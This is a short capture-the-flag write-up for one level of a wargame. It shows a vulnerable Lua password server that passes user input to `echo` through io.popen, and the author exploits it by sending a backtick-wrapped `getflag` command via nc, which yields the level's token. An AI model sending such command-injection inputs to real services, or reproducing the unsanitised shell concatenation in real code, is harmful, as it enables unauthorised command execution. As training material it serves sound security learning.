## LEVEL 11

---

This level is similar to previous levels but this time it's `.lua` file.

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

In this level I don't have any hidden file or token file but we have `echo` command and our file is owned by flag11.

So I need to execute `getflag` through the command. Previously I saw that if I use back quotes `echo` can run the command inside and I will redirect the output of this command otherwise `level11` will redirect the output inside `sha1sum`.

```shell
$ nc 127.0.0.1 5151
Password: `getflag > /tmp/flag`
Erf nope..
$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

---

*Source :*

*https://linux.die.net/man/1/nc*